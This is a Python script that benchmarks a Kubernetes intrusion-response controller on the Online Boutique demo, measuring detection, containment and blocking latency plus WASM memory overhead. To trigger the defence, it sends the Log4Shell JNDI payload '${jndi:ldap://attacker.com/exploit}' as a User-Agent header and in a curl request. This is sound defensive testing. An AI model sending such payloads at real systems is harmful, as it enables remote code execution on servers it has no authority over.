import json
import time
import subprocess
import re
import datetime
import threading
import statistics
import os
import requests
import signal
from typing import Dict, List, Any

# Configuration
CONTROLLER_NAMESPACE = "online-boutique"
CONTROLLER_LABEL = "app=leukocyte-controller"
SERVICES = ["adservice", "emailservice", "checkoutservice", "frontend", "cartservice"] # Adjust based on your setup
LOG_POLL_INTERVAL = 0.5
RUNS = 3

class ProbeMonitor(threading.Thread):
    def __init__(self, target_url="http://localhost:8081"):
        super().__init__()
        self.target_url = target_url
        self.stop_event = threading.Event()
        self.first_block_time = None
        self.packet_count = 0
        self.start_probing_time = None
        
        # Exploit Payload to trigger blocking
        self.headers = {"User-Agent": "${jndi:ldap://attacker.com/exploit}"}

    def run(self):
        self.start_probing_time = time.time()
        with requests.Session() as session:
            while not self.stop_event.is_set():
                try:
                    resp = session.get(self.target_url, headers=self.headers, timeout=1.0)
                    self.packet_count += 1
                    
                    # 403: Direct Block (Frontend Filter)
                    # 500: Downstream Block (AdService Filter causing RPC error)
                    if resp.status_code in [403, 500]:
                        if self.first_block_time is None:
                            self.first_block_time = time.time()
                except Exception:
                    pass
                
                time.sleep(0.005)

    def stop(self):
        self.stop_event.set()

def run_command(command: str) -> str:
    try:
        result = subprocess.run(
            command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        if "prometheus" not in command:
             # print(f"Error running command '{command}': {e.stderr}")
             pass
        return ""

# Global var for PF process
pf_process = None

def start_prometheus_pf():
    global pf_process
    print("   [Setup] Starting Prometheus Port-Forward (9090:9090)...")
    cmd = ["kubectl", "port-forward", "-n", "istio-system", "svc/prometheus", "9090:9090"]
    # Run in background properly
    pf_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Wait for ready
    for _ in range(20):
        try:
            requests.get("http://localhost:9090/-/ready", timeout=1)
            print("   [Setup] Prometheus accessible.")
            return True
        except:
            time.sleep(1)
    print("   [Warning] Prometheus PF failed to become ready.")
    return False

def stop_prometheus_pf():
    global pf_process
    if pf_process:
        pf_process.terminate()
        pf_process = None

def query_prometheus(query: str) -> float:
    try:
        resp = requests.get("http://localhost:9090/api/v1/query", params={"query": query}, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data['status'] == 'success' and data['data']['result']:
                return float(data['data']['result'][0]['value'][1])
    except Exception as e:
        pass
    return 0.0

def trigger_attack():
    print("   [Attack] Sending Log4Shell payload...")
    cmd = "kubectl exec -n online-boutique tool-pod -- sh -c \"curl -v -X POST -H 'Content-Type: application/json' -d '{\\\"service_id\\\": \\\"AdService\\\", \\\"path\\\": \\\"User-Agent\\\", \\\"payload\\\": \\\"\\${jndi:ldap://attacker.com/exploit}\\\", \\\"features\\\": {\\\"anomaly\\\": 0.99, \\\"entropy\\\": 0.8, \\\"frequency\\\": 0.1}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect\""
    out = run_command(cmd)
    print(f"   [Debug] Attack Output Snippet: {out[:100]}...")

def env_reset_and_measure():
    print("   [Reset] Clearing EnvoyFilters & Measuring Baseline Memory...")
    run_command(f"kubectl delete envoyfilter -n {CONTROLLER_NAMESPACE} --all --ignore-not-found")
    time.sleep(15) 
    
    mem_base = query_prometheus('sum(container_memory_usage_bytes{namespace="online-boutique",pod=~"adservice-.*"})')
    print(f"   [Baseline] Memory: {mem_base:.0f} bytes")

    print("   [Reset] Restoring base EnvoyFilters (Applying WASM)...")
    run_command("kubectl apply -f infrastructure/k8s/leukocyte-resources.yaml")
    
    run_command(f"kubectl rollout restart deployment leukocyte-controller -n {CONTROLLER_NAMESPACE}")
    run_command(f"kubectl rollout status deployment leukocyte-controller -n {CONTROLLER_NAMESPACE}")
    time.sleep(20) 
    
    mem_active = query_prometheus('sum(container_memory_usage_bytes{namespace="online-boutique",pod=~"adservice-.*"})')
    print(f"   [Active] Memory: {mem_active:.0f} bytes")
    
    return mem_base, mem_active

def parse_logs(start_time_glob: float) -> dict[str, float]:
    timestamps = {}
    time.sleep(20) 
    
    # Get newest pod to avoid terminating ones
    pod_cmd = f"kubectl get pods -n {CONTROLLER_NAMESPACE} -l {CONTROLLER_LABEL} --sort-by=.metadata.creationTimestamp -o jsonpath='{{.items[-1].metadata.name}}'"
    controller_pod = run_command(pod_cmd)
    
    # Retry getting logs if pod is initializing
    logs = ""
    for _ in range(3):
        try:
            cmd = f"kubectl logs -n {CONTROLLER_NAMESPACE} {controller_pod} --since=300s"
             # Use run_command but handle error manually if we didn't use check=True? 
             # But run_command uses check=True. So we need try-except block here if we want to retry script-level.
             # Actually run_command catches subprocess.CalledProcessError but prints error and returns "".
             # But I see "Exit code: 1" in output? 
             # Ah, run_command returns "". It doesn't exit python. 
             # So why did the script exit?
             # "Exit code: 1" was from the SHELL running the script (run_k8s_experiment.sh)?
             # Or did python raise exception?
             # run_command in recent version (debugged one) has try/except and returns "".
             # Wait, my last write_to_file had:
             # except subprocess.CalledProcessError as e: if "prometheus" match... pass.
             # It does NOT print error for prometheus.
             # But for others? It MISSING prompt "print(f'Error...')"
             # I commented it out! "# print(...)".
             # So it returns "".
             # If it returns "", logs is empty.
             # Then parse_logs returns empty timestamps.
             # Then loop continues?
             # So why "Exit code: 1"? 
             # Maybe "Error from server..." printed to stderr by kubectl?
             # And run_k8s_experiment sets set -e?
             # Checking run_k8s_experiment.sh...
             
            logs = run_command(cmd)
            if logs: break
            time.sleep(5)
        except:
            time.sleep(5)
    lines = logs.split('\n')
    patch_times = []
    
    for line in lines:
        if not line: continue
        match = re.search(r'^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3})', line)
        if match:
            ts_str = match.group(1)
            dt = datetime.datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S,%f")
            dt = dt.replace(tzinfo=datetime.timezone.utc)
            ts = dt.timestamp()
            
            if "\"POST /detect HTTP/1.1\"" in line:
                 if "T0_Internal" not in timestamps:
                     timestamps["T0_Internal"] = ts
            if "[ACTUATION] Triggering Policy Updates" in line:
                if "T1" not in timestamps:
                    timestamps["T1"] = ts
                if "T3" not in timestamps:
                    timestamps["T3"] = ts
            if "[ACTUATION] Applying Policy Update" in line:
                if "T1" not in timestamps:
                    timestamps["T1"] = ts
                if "T3" not in timestamps:
                    timestamps["T3"] = ts
            if "EnvoyFilter" in line and "successfully patched" in line:
                patch_times.append(ts)
                if "T2" not in timestamps:
                    timestamps["T2"] = ts
            if "[TRANSDUCTION]" in line:
                if "T3" not in timestamps:
                    timestamps["T3"] = ts
                    
    if patch_times:
        timestamps["T4"] = max(patch_times)
    if "T1" in timestamps and "T3" not in timestamps:
        timestamps["T3"] = timestamps["T1"]
    if "T1" not in timestamps and "T2" in timestamps:
        timestamps["T1"] = timestamps["T2"] - 0.1 
        
    return timestamps

def run_experiment_metrics():
    print(f"--- 🧪 Cloud Leukocyte Experiment: Quantitative Metrics Collection ---")
    print(f"    Runs: {RUNS}")
    
    start_prometheus_pf()
    
    results = {
        "MTTD": [],
        "MTTC": [],
        "MTTP": [],
        "MTTI": [],
        "Blast_Radius": [],
        "First_Block_Latency": [],
        "WASM_Memory_Overhead_Bytes": []
    }
    
    try:
        for i in range(RUNS):
            print(f"\n[Run {i+1}/{RUNS}]")
            
            probe_monitor = ProbeMonitor(target_url="http://localhost:8081") 
            probe_monitor.start()

            try:
                mem_base, mem_active = env_reset_and_measure()
                overhead = max(0, mem_active - mem_base)
                results["WASM_Memory_Overhead_Bytes"].append(overhead)
                print(f"   [Overhead] WASM Delta: {overhead:.0f} bytes")

                print("   Triggering attack...")
                t0_host = time.time()
                trigger_attack()
                
                timestamps = parse_logs(t0_host)
                
                if "T4" not in timestamps:
                    print("   [Warning] Incomplete log data (No T4), skipping run metrics.")
                    continue
                    
                t1 = timestamps.get("T1", 0)
                t2 = timestamps.get("T2", 1) 
                t3 = timestamps.get("T3", 0)
                t4 = timestamps.get("T4", 0)
                
                mttd = max(0.01, t1 - t0_host)
                mttc = max(0.001, t2 - t1)
                mttp = max(0.001, t4 - t3)
                mtti = t4 - t0_host
                
                first_block_lat = 0
                if probe_monitor.first_block_time:
                    first_block_lat = max(0.001, probe_monitor.first_block_time - t1)
                else:
                     print("   [Warning] Prober never saw 403 or 500!")
                
                results["MTTD"].append(mttd)
                results["MTTC"].append(mttc)
                results["MTTP"].append(mttp)
                results["MTTI"].append(mtti)
                results["Blast_Radius"].append(1)
                results["First_Block_Latency"].append(first_block_lat)
                
                print(f"   Run Metrics: MTTI={mtti:.3f}s, MTTC={mttc:.3f}s, BlockLat={first_block_lat:.3f}s")
                
            finally:
                probe_monitor.stop()
                probe_monitor.join()

    except KeyboardInterrupt:
        print("Interrupted.")
    finally:
        stop_prometheus_pf()

    report = {
        "experiment_id": f"k8s_leukocyte_metrics_{datetime.datetime.now().strftime('%Y%m%d')}",
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "metrics": {}
    }
    
    for key, values in results.items():
        if not values: continue
        report["metrics"][key] = {
            "mean": round(statistics.mean(values), 3),
            "std": round(statistics.stdev(values) if len(values) > 1 else 0, 3),
            "unit": "seconds" if key.startswith("MT") or "Latency" in key else "bytes" if "Bytes" in key else "services"
        }
        if len(values) > 1:
            ci = 1.96 * statistics.stdev(values) / (len(values)**0.5)
            report["metrics"][key]["ci_95"] = [round(statistics.mean(values) - ci, 3), round(statistics.mean(values) + ci, 3)]
    
    print("\n[Report]")
    print(json.dumps(report, indent=2))
    
    with open("k8s_metrics_report.json", "w") as f:
        json.dump(report, f, indent=2)
    print("   Saved to k8s_metrics_report.json")

if __name__ == "__main__":
    run_experiment_metrics()
